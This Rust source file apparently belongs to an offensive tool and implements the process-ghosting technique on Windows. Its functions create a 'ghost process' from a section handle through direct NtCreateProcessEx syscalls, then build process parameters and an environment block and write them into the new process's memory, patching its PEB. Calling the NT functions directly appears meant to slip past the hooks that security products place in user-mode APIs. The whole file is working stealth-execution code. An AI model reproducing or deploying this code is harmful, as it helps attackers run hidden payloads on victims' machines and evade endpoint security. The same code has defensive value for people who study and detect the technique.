use alloc::vec::Vec;
use core::{mem::zeroed, ptr::null_mut};
use ntapi::{
    ntpebteb::PEB,
    ntpsapi::{
        NtCurrentProcess, PROCESS_BASIC_INFORMATION, PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
        ProcessBasicInformation,
    },
    ntrtl::{
        RTL_USER_PROC_PARAMS_NORMALIZED, RTL_USER_PROCESS_PARAMETERS, RtlCreateProcessParametersEx,
        RtlInitUnicodeString,
    },
};
use windows_sys::Win32::{
    Foundation::{MAX_PATH, UNICODE_STRING},
    System::{
        Environment::{CreateEnvironmentBlock, GetEnvironmentVariableW},
        Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE},
        Threading::PROCESS_ALL_ACCESS,
    },
};

use crate::{log, syscall};

pub unsafe fn create_ghost_process(section_handle: usize) -> Option<usize> {
    unsafe {
        let mut process_handle: usize = 0;
        let status = syscall!(
            "NtCreateProcessEx",
            &mut process_handle,
            PROCESS_ALL_ACCESS,
            null_mut::<u8>(),
            NtCurrentProcess,
            PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
            section_handle,
            null_mut::<u8>(),
            null_mut::<u8>(),
            0
        );

        if status < 0 {
            log!("NtCreateProcessEx failed: 0x{:X}", status as u32);
            syscall!("NtClose", process_handle);
            return None;
        }

        log!("NtCreateProcessEx succeeded. Process handle = 0x{:X}", process_handle);
        Some(process_handle)
    }
}

pub unsafe fn initialize_process_parms(
    process_handle: usize,
    target_process_path: *const u16,
    image_base_out: *mut *mut core::ffi::c_void,
) -> bool {
    unsafe {
        let mut us_cmdline: UNICODE_STRING = zeroed();
        let mut us_imagepath: UNICODE_STRING = zeroed();
        let mut us_currentdir: UNICODE_STRING = zeroed();
        let mut peb: PEB = zeroed();
        let mut proc_info: PROCESS_BASIC_INFORMATION = zeroed();
        let mut status;

        let mut environment: *mut core::ffi::c_void = null_mut();

        // Get current directory
        let mut current_dir_buf: [u16; MAX_PATH as usize] = [0; MAX_PATH as usize];
        let len = GetEnvironmentVariableW(
            "SystemRoot\0".encode_utf16().collect::<Vec<u16>>().as_ptr(),
            current_dir_buf.as_mut_ptr(),
            MAX_PATH,
        );
        if len == 0 {
            log!("GetEnvironmentVariableW failed.");
            return false;
        }

        // Build strings
        RtlInitUnicodeString(
            &mut us_cmdline as *mut UNICODE_STRING as _,
            target_process_path,
        );
        RtlInitUnicodeString(
            &mut us_currentdir as *mut UNICODE_STRING as _,
            current_dir_buf.as_ptr(),
        );
        RtlInitUnicodeString(
            &mut us_imagepath as *mut UNICODE_STRING as _,
            target_process_path,
        );

        // Get environment block
        if CreateEnvironmentBlock(&mut environment as *mut _ as _, 0, 1) == 0 {
            log!("CreateEnvironmentBlock failed.");
            return false;
        }

        // Create process parameters
        let mut process_params: *mut RTL_USER_PROCESS_PARAMETERS = null_mut();
        status = RtlCreateProcessParametersEx(
            &mut process_params as *mut _,
            &us_imagepath as *const UNICODE_STRING as _,
            null_mut(),
            &us_currentdir as *const UNICODE_STRING as _,
            &us_cmdline as *const UNICODE_STRING as _,
            environment as *mut UNICODE_STRING as _,
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            RTL_USER_PROC_PARAMS_NORMALIZED,
        );

        if status < 0 {
            log!(
                "[!] RtlCreateProcessParametersEx failed: 0x{:X}",
                status as u32
            );
            return false;
        }

        // Fetch remote PEB
        status = syscall!(
            "NtQueryInformationProcess",
            process_handle,
            ProcessBasicInformation,
            &mut proc_info,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            null_mut::<u8>()
        );
        if status < 0 {
            log!(
                "[!] NtQueryInformationProcess failed: 0x{:X}",
                status as u32
            );
            return false;
        }

        // Read PEB
        status = syscall!(
            "NtReadVirtualMemory",
            process_handle,
            proc_info.PebBaseAddress,
            &mut peb,
            size_of::<PEB>() as usize,
            null_mut::<u8>()
        );
        if status < 0 {
            log!("NtReadVirtualMemory failed: 0x{:X}", status as u32);
            return false;
        }

        log!("Ghost Process PEB: {:p}", proc_info.PebBaseAddress);
        *image_base_out = peb.ImageBaseAddress as *mut _;
        log!("Ghost Process ImageBase: {:p}", *image_base_out);

        // Compute address ranges
        let mut env_and_params_base = process_params as usize;
        let mut env_and_params_end = env_and_params_base + (*process_params).Length as usize;

        if !(*process_params).Environment.is_null() {
            let env_base = (*process_params).Environment as usize;
            let env_end = env_base + (*process_params).EnvironmentSize as usize;

            if env_base < env_and_params_base {
                env_and_params_base = env_base;
            }
            if env_end > env_and_params_end {
                env_and_params_end = env_end;
            }
        }

        let env_and_params_size = env_and_params_end - env_and_params_base;
        let mut remote_base = env_and_params_base as *mut core::ffi::c_void;
        let mut written = 0;

        // Allocate memory in target process
        status = syscall!(
            "NtAllocateVirtualMemory",
            process_handle,
            &mut remote_base,
            0,
            &mut (env_and_params_size as usize),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );

        if status < 0 {
            log!("NtAllocateVirtualMemory failed: 0x{:X}", status as u32);
            return false;
        }

        // Write ProcessParameters
        status = syscall!(
            "NtWriteVirtualMemory",
            process_handle,
            process_params,
            process_params,
            (*process_params).Length as usize,
            &mut written
        );

        if status < 0 {
            log!("NtWriteVirtualMemory [1] failed: 0x{:X}", status as u32);
            return false;
        }

        // Write Environment
        if !(*process_params).Environment.is_null() {
            status = syscall!(
                "NtWriteVirtualMemory",
                process_handle,
                (*process_params).Environment,
                (*process_params).Environment,
                (*process_params).EnvironmentSize as usize,
                &mut written
            );

            if status < 0 {
                log!("NtWriteVirtualMemory [2] failed: 0x{:X}", status as u32);
                return false;
            }
        }

        // Update PEB->ProcessParameters
        status = syscall!(
            "NtWriteVirtualMemory",
            process_handle,
            &mut (*(proc_info.PebBaseAddress)).ProcessParameters,
            &process_params,
            size_of::<*mut RTL_USER_PROCESS_PARAMETERS>(),
            &mut written
        );

        if status < 0 {
            log!("NtWriteVirtualMemory [3] failed: 0x{:X}", status as u32);
            return false;
        }

        log!("InitializeProcessParms success.");
        true
    }
}
